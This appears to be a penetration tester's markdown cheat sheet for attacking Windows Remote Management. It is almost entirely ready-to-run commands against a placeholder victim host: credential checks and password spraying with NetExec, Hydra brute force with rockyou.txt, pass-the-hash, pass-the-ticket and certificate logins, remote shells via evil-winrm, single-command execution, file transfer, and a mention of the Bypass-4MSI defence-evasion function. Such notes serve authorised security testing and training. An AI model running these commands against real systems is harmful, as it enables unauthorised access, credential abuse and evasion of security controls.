- `WinRM = Windows Remote Management (PowerShell remoting). Ports: 5985 (HTTP), 5986 (HTTPS).`
- `Needs valid creds — the user must be in "Remote Management Users" (or a local admin).`

### <span style="color:#50FA7B">Check access</span>
```bash
# password
nxc winrm $VICTIM_IP -u $USER -p '$PASS'

# pass-the-hash
nxc winrm $VICTIM_IP -u $USER -H <NTLM_HASH>

# with a domain
nxc winrm $VICTIM_IP -u $USER -p '$PASS' -d $DOMAIN
```
> [!tip] `(Pwn3d!)` in the nxc output means that account can get a shell via evil-winrm.

### <span style="color:#50FA7B">Connect (evil-winrm)</span>
```bash
# password
evil-winrm -i $VICTIM_IP -u $USER -p '$PASS'

# pass-the-hash
evil-winrm -i $VICTIM_IP -u $USER -H <NTLM_HASH>

# over HTTPS (port 5986)
evil-winrm -i $VICTIM_IP -u $USER -p '$PASS' -S

# with a certificate (PKINIT / client cert)
evil-winrm -i $VICTIM_IP -S -c cert.pem -k key.pem
```

### <span style="color:#50FA7B">Kerberos (pass-the-ticket)</span>
```bash
export KRB5CCNAME=$USER.ccache
evil-winrm -i $VICTIM_IP -r $DOMAIN
```

### <span style="color:#50FA7B">Brute-Force Login</span>
```bash
# NetExec (spray a password across users)
nxc winrm $VICTIM_IP -u users.txt -p '$PASS' --continue-on-success

# Hydra
hydra -L users.txt -P $WORDLIST_PATH/rockyou.txt $VICTIM_IP winrm
```

### <span style="color:#50FA7B">Command execution without a shell</span>
```bash
# run a single command with nxc
nxc winrm $VICTIM_IP -u $USER -p '$PASS' -x 'whoami /all'
```

> [!info] evil-winrm built-ins
> Inside an evil-winrm session: `upload <local> <remote>` and `download <remote> <local>` for file transfer, and `menu` to list loaded functions (e.g. `Invoke-Binary`, `Bypass-4MSI`).
